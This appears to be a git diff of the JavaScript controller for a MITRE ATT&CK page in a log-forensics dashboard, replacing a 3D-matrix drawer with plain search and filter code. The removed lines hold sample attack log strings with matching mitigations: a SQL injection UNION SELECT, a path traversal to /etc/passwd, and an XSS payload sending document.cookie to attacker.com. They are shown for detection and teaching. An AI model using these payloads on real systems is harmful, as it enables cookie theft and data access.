@@ -1,95 +1,527 @@
-/**
- * INTELLIGENT LOG FORENSIC - MITRE ATT&CK PAGE CONTROLLER
- * 3D Tactical Matrix interaction, category filters, and slide-in forensics drawer
- */
+/* ============================================================
+   MITRE ATT&CK PAGE
+   Intelligent Log Forensics
+   ============================================================ */
 
-document.addEventListener('DOMContentLoaded', () => {
-  const drawer = document.getElementById('mitre-drawer');
-  const closeDrawerBtn = document.getElementById('close-drawer-btn');
+(function () {
+    "use strict";
 
-  // 1. Initialize 3D MITRE Matrix
-  const mitreMatrix = new MitreMatrix3D('mitre-matrix-canvas', {
-    isMiniTeaser: false,
-    onSelectTechnique: (tech) => showTechniqueDetail(tech)
-  });
+    const state = {
+        selectedTechnique: null,
+        searchQuery: "",
+        activeFilter: "all"
+    };
 
-  // 2. Tactic Filter Chips
-  document.querySelectorAll('.tactic-chip').forEach(chip => {
-    chip.addEventListener('click', () => {
-      document.querySelectorAll('.tactic-chip').forEach(c => c.classList.remove('active'));
-      chip.classList.add('active');
-      const tactic = chip.getAttribute('data-tactic');
-      if (mitreMatrix) {
-        mitreMatrix.filterByTactic(tactic);
-      }
-    });
-  });
+    /* ----------------------------------------------------------
+       Helpers
+    ---------------------------------------------------------- */
 
-  // 3. Technique Detail Drawer Handler
-  function showTechniqueDetail(tech) {
-    if (!drawer) return;
-
-    document.getElementById('drawer-tech-id').textContent = tech.id;
-    document.getElementById('drawer-tech-name').textContent = tech.name;
-    document.getElementById('drawer-tech-tactic').textContent = tech.tactic;
-    document.getElementById('drawer-tech-detected-count').textContent = `${tech.detected} events detected`;
-
-    // Severity badge
-    const badge = document.getElementById('drawer-tech-sev');
-    if (badge) {
-      badge.textContent = (tech.sev || 'medium').toUpperCase();
-      badge.className = `badge ${tech.sev === 'critical' ? 'badge-critical' : 'badge-high'}`;
+    function qs(selector, parent = document) {
+        return parent.querySelector(selector);
     }
 
-    // Populate forensic mitigation and log patterns
-    document.getElementById('drawer-tech-logs').innerHTML = `
-      <div style="background:var(--surface-secondary);padding:10px;border-radius:4px;font-family:var(--font-mono);font-size:0.8rem;border:1px solid var(--panel-border);color:#67E8F9;">
-        ${getExampleLog(tech.id)}
-      </div>
-    `;
+    function qsa(selector, parent = document) {
+        return Array.from(parent.querySelectorAll(selector));
+    }
 
-    document.getElementById('drawer-tech-mitigations').innerHTML = `
-      <ul style="padding-left:18px;font-size:0.85rem;color:var(--text-secondary);line-height:1.6;">
-        ${getMitigations(tech.id).map(m => `<li>${m}</li>`).join('')}
-      </ul>
-    `;
+    function normalize(value) {
+        return String(value || "").trim().toLowerCase();
+    }
 
-    drawer.classList.add('open');
-  }
+    function getTechniqueId(element) {
+        return (
+            element.dataset.techniqueId ||
+            element.dataset.technique ||
+            qs("[data-technique-id]", element)?.dataset.techniqueId ||
+            ""
+        );
+    }
 
-  function getExampleLog(id) {
-    const examples = {
-      'T1190': 'POST /api/v1/search HTTP/1.1 - payload: \' UNION SELECT null, username, password FROM users --',
-      'T1110': 'AUTH FAIL - user: root - ip: 198.51.100.44 - attempt 52 in 30s',
-      'T1083': 'GET /static/../../etc/passwd HTTP/1.1 - status 403 Forbidden',
-      'T1059': 'GET /search?q=<script>fetch("http://attacker.com/"+document.cookie)</script>',
-      'T1046': 'SCAN - 192.168.1.0/24 - SYN probe on ports 22,80,443,3306,8080',
-      'T1068': 'SUDO: guest : COMMAND=/bin/bash (NOPASSWD root execution)',
-      'T1041': 'POST /upload - 847MB transferred outbound to external ASN 45.146.164.110',
-      'T1071': 'GET /c2/beacon - interval 30s - AES encrypted token stream',
-      'T1003': 'ACCESS: /etc/shadow - Process: mimikatz (Memory extraction)',
-      'T1021': 'SSH: 10.0.0.12 -> 10.0.0.47:22 - Accepted publickey for admin'
+    /* ----------------------------------------------------------
+       Technique selection
+    ---------------------------------------------------------- */
+
+    function selectTechnique(element) {
+        if (!element) {
+            return;
+        }
+
+        qsa(
+            ".mitre-technique.active, " +
+            ".technique-card.active, " +
+            ".matrix-cell.active, " +
+            "[data-technique].active"
+        ).forEach((item) => {
+            item.classList.remove("active");
+        });
+
+        element.classList.add("active");
+
+        const techniqueId = getTechniqueId(element);
+        state.selectedTechnique = techniqueId || null;
+
+        document.dispatchEvent(
+            new CustomEvent("ilf:mitre-technique-selected", {
+                detail: {
+                    techniqueId: state.selectedTechnique,
+                    element
+                }
+            })
+        );
+
+        updateTechniqueDetail(element);
+    }
+
+    /* ----------------------------------------------------------
+       Detail panel
+    ---------------------------------------------------------- */
+
+    function updateTechniqueDetail(element) {
+        const detailPanel = qs(
+            "#mitre-detail, " +
+            "#technique-detail, " +
+            ".mitre-detail-panel, " +
+            ".technique-detail"
+        );
+
+        if (!detailPanel || !element) {
+            return;
+        }
+
+        const id =
+            getTechniqueId(element) ||
+            element.getAttribute("data-id") ||
+            "UNMAPPED";
+
+        const name =
+            element.dataset.techniqueName ||
+            element.dataset.name ||
+            qs("[data-technique-name]", element)?.textContent ||
+            qs(".technique-name", element)?.textContent ||
+            element.textContent.trim();
+
+        const description =
+            element.dataset.description ||
+            qs("[data-technique-description]", element)?.textContent ||
+            qs(".technique-description", element)?.textContent ||
+            "";
+
+        const idTarget = qs(
+            "[data-detail-technique-id], #detail-technique-id",
+            detailPanel
+        );
+
+        const nameTarget = qs(
+            "[data-detail-technique-name], #detail-technique-name",
+            detailPanel
+        );
+
+        const descriptionTarget = qs(
+            "[data-detail-technique-description], #detail-technique-description",
+            detailPanel
+        );
+
+        if (idTarget) {
+            idTarget.textContent = id;
+        }
+
+        if (nameTarget) {
+            nameTarget.textContent = name.trim();
+        }
+
+        if (descriptionTarget) {
+            descriptionTarget.textContent =
+                description.trim() || "No technique description available.";
+        }
+
+        detailPanel.classList.add("is-visible");
+    }
+
+    /* ----------------------------------------------------------
+       Search
+    ---------------------------------------------------------- */
+
+    function filterTechniques(query) {
+        state.searchQuery = normalize(query);
+
+        const techniques = qsa(
+            "[data-technique], " +
+            ".mitre-technique, " +
+            ".technique-card, " +
+            ".matrix-cell"
+        );
+
+        techniques.forEach((item) => {
+            const searchableText = normalize(
+                [
+                    item.textContent,
+                    item.dataset.techniqueId,
+                    item.dataset.techniqueName,
+                    item.dataset.name,
+                    item.dataset.description
+                ]
+                    .filter(Boolean)
+                    .join(" ")
+            );
+
+            const matches =
+                !state.searchQuery ||
+                searchableText.includes(state.searchQuery);
+
+            item.hidden = !matches;
+            item.classList.toggle("search-hidden", !matches);
+        });
+
+        updateEmptySearchState(techniques);
+    }
+
+    function updateEmptySearchState(items) {
+        const visibleItems = items.filter((item) => !item.hidden);
+
+        const emptyState = qs(
+            "#mitre-search-empty, " +
+            ".mitre-search-empty, " +
+            "[data-mitre-search-empty]"
+        );
+
+        if (!emptyState) {
+            return;
+        }
+
+        emptyState.hidden = visibleItems.length !== 0;
+    }
+
+    /* ----------------------------------------------------------
+       Filters
+    ---------------------------------------------------------- */
+
+    function applyFilter(filter) {
+        state.activeFilter = normalize(filter) || "all";
+
+        qsa(
+            "[data-mitre-filter], " +
+            ".mitre-filter, " +
+            ".filter-button"
+        ).forEach((button) => {
+            const buttonFilter = normalize(
+                button.dataset.mitreFilter ||
+                button.dataset.filter ||
+                button.getAttribute("data-value")
+            );
+
+            button.classList.toggle(
+                "active",
+                buttonFilter === state.activeFilter
+            );
+        });
+
+        const items = qsa(
+            "[data-technique], " +
+            ".mitre-technique, " +
+            ".technique-card, " +
+            ".matrix-cell"
+        );
+
+        items.forEach((item) => {
+            if (state.activeFilter === "all") {
+                item.classList.remove("filter-hidden");
+                item.hidden = false;
+                return;
+            }
+
+            const category = normalize(
+                item.dataset.category ||
+                item.dataset.tactic ||
+                item.dataset.severity ||
+                ""
+            );
+
+            const matches =
+                category === state.activeFilter ||
+                category.split(",").map(normalize).includes(state.activeFilter);
+
+            item.classList.toggle("filter-hidden", !matches);
+
+            if (!matches) {
+                item.hidden = true;
+            } else {
+                item.hidden = false;
+            }
+        });
+
+        if (state.searchQuery) {
+            filterTechniques(state.searchQuery);
+        }
+    }
+
+    /* ----------------------------------------------------------
+       Search input initialization
+    ---------------------------------------------------------- */
+
+    function initializeSearch() {
+        const searchInput = qs(
+            "#mitre-search, " +
+            "#technique-search, " +
+            "[data-mitre-search]"
+        );
+
+        if (!searchInput) {
+            return;
+        }
+
+        searchInput.addEventListener("input", function () {
+            filterTechniques(this.value);
+        });
+
+        searchInput.addEventListener("keydown", function (event) {
+            if (event.key === "Escape") {
+                this.value = "";
+                filterTechniques("");
+                this.blur();
+            }
+        });
+    }
+
+    /* ----------------------------------------------------------
+       Filter buttons
+    ---------------------------------------------------------- */
+
+    function initializeFilters() {
+        qsa(
+            "[data-mitre-filter], " +
+            ".mitre-filter, " +
+            ".filter-button"
+        ).forEach((button) => {
+            button.addEventListener("click", function () {
+                const filter =
+                    this.dataset.mitreFilter ||
+                    this.dataset.filter ||
+                    this.dataset.value ||
+                    "all";
+
+                applyFilter(filter);
+            });
+        });
+    }
+
+    /* ----------------------------------------------------------
+       Technique click handlers
+    ---------------------------------------------------------- */
+
+    function initializeTechniqueSelection() {
+        qsa(
+            "[data-technique], " +
+            ".mitre-technique, " +
+            ".technique-card, " +
+            ".matrix-cell"
+        ).forEach((element) => {
+            element.addEventListener("click", function (event) {
+                if (
+                    event.target.closest("a") ||
+                    event.target.closest("button")
+                ) {
+                    return;
+                }
+
+                selectTechnique(this);
+            });
+
+            element.setAttribute("tabindex", "0");
+
+            element.addEventListener("keydown", function (event) {
+                if (event.key === "Enter" || event.key === " ") {
+                    event.preventDefault();
+                    selectTechnique(this);
+                }
+            });
+        });
+    }
+
+    /* ----------------------------------------------------------
+       Keyboard shortcut
+    ---------------------------------------------------------- */
+
+    function initializeKeyboardShortcuts() {
+        document.addEventListener("keydown", function (event) {
+            const activeElement = document.activeElement;
+
+            const isTyping =
+                activeElement &&
+                (
+                    activeElement.tagName === "INPUT" ||
+                    activeElement.tagName === "TEXTAREA" ||
+                    activeElement.isContentEditable
+                );
+
+            if (isTyping) {
+                return;
+            }
+
+            if (event.key === "/") {
+                const searchInput = qs(
+                    "#mitre-search, " +
+                    "#technique-search, " +
+                    "[data-mitre-search]"
+                );
+
+                if (searchInput) {
+                    event.preventDefault();
+                    searchInput.focus();
+                }
+            }
+
+            if (event.key === "Escape") {
+                qsa(
+                    ".mitre-technique.active, " +
+                    ".technique-card.active, " +
+                    ".matrix-cell.active"
+                ).forEach((item) => {
+                    item.classList.remove("active");
+                });
+
+                state.selectedTechnique = null;
+            }
+        });
+    }
+
+    /* ----------------------------------------------------------
+       3D integration
+    ---------------------------------------------------------- */
+
+    function initializeThreeScene() {
+        /*
+         * Do not directly assume THREE exists.
+         * The page can work normally even when Three.js is absent.
+         */
+
+        if (typeof window.THREE === "undefined") {
+            document.documentElement.classList.add(
+                "three-unavailable"
+            );
+            return;
+        }
+
+        document.documentElement.classList.add(
+            "three-available"
+        );
+
+        document.dispatchEvent(
+            new CustomEvent("ilf:mitre-three-ready")
+        );
+    }
+
+    /* ----------------------------------------------------------
+       EventBus integration
+    ---------------------------------------------------------- */
+
+    function initializeEventBus() {
+        if (
+            typeof window.EventBus === "undefined" ||
+            typeof window.EventBus.on !== "function"
+        ) {
+            return;
+        }
+
+        window.EventBus.on(
+            "mitre:select-technique",
+            function (payload) {
+                if (!payload) {
+                    return;
+                }
+
+                const id =
+                    payload.techniqueId ||
+                    payload.id;
+
+                if (!id) {
+                    return;
+                }
+
+                const element = qs(
+                    `[data-technique-id="${CSS.escape(id)}"]`
+                );
+
+                if (element) {
+                    selectTechnique(element);
+                }
+            }
+        );
+    }
+
+    /* ----------------------------------------------------------
+       Live technique counters
+    ---------------------------------------------------------- */
+
+    function updateCounters() {
+        const techniques = qsa(
+            "[data-technique], " +
+            ".mitre-technique, " +
+            ".technique-card, " +
+            ".matrix-cell"
+        );
+
+        const visible = techniques.filter(
+            (item) => !item.hidden
+        );
+
+        const totalTarget = qs(
+            "#mitre-total-techniques, " +
+            "[data-mitre-total]"
+        );
+
+        const visibleTarget = qs(
+            "#mitre-visible-techniques, " +
+            "[data-mitre-visible]"
+        );
+
+        if (totalTarget) {
+            totalTarget.textContent = techniques.length;
+        }
+
+        if (visibleTarget) {
+            visibleTarget.textContent = visible.length;
+        }
+    }
+
+    /* ----------------------------------------------------------
+       Initialization
+    ---------------------------------------------------------- */
+
+    function init() {
+        initializeSearch();
+        initializeFilters();
+        initializeTechniqueSelection();
+        initializeKeyboardShortcuts();
+        initializeThreeScene();
+        initializeEventBus();
+        updateCounters();
+
+        document.documentElement.classList.add(
+            "mitre-page-ready"
+        );
+    }
+
+    if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", init);
+    } else {
+        init();
+    }
+
+    /* ----------------------------------------------------------
+       Public API
+    ---------------------------------------------------------- */
+
+    window.MitrePage = {
+        selectTechnique,
+        filterTechniques,
+        applyFilter,
+        getState: function () {
+            return {
+                selectedTechnique: state.selectedTechnique,
+                searchQuery: state.searchQuery,
+                activeFilter: state.activeFilter
+            };
+        }
     };
-    return examples[id] || 'Anomalous network telemetry payload flagged by detection engine.';
-  }
 
-  function getMitigations(id) {
-    const mitigations = {
-      'T1190': ['Implement parameterized SQL queries / ORM prepared statements', 'Deploy Web Application Firewall (WAF) with OWASP Core Rules', 'Audit endpoint input validation schemas'],
-      'T1110': ['Enforce Multi-Factor Authentication (MFA)', 'Configure IP rate limiting and exponential lockout timers', 'Deploy adaptive behavioral CAPTCHA challenge'],
-      'T1083': ['Normalize file paths and validate against strict directory whitelists', 'Run web server with minimal chroot jail permissions'],
-      'T1059': ['Implement Content Security Policy (CSP) headers', 'Contextually encode all dynamic user output in DOM templates'],
-      'T1046': ['Configure ingress firewall to drop unsolicited port scans', 'Deploy internal honeypots to detect lateral network mapping'],
-      'T1068': ['Audit sudoers file and eliminate wildcards / NOPASSWD directives', 'Keep kernel and suid binaries strictly patched'],
-      'T1041': ['Enforce outbound egress traffic filtering and DLP monitors', 'Alert on high-volume asymmetric egress anomalies'],
-      'T1071': ['Implement TLS inspection and C2 domain reputation filtering', 'Detect periodic beaconing jitter via statistical traffic analysis'],
-      'T1003': ['Enable LSASS RunAsPPL protection on Windows hosts', 'Restrict /etc/shadow read access to root only with auditd monitoring'],
-      'T1021': ['Enforce SSH certificate authority and disable password authentication', 'Segment network VPC subnets with strict microsegmentation']
-    };
-    return mitigations[id] || ['Apply least privilege access principles', 'Monitor host telemetry with endpoint detection (EDR)'];
-  }
-
-  if (closeDrawerBtn && drawer) {
-    closeDrawerBtn.addEventListener('click', () => drawer.classList.remove('open'));
-  }
-});
+})();
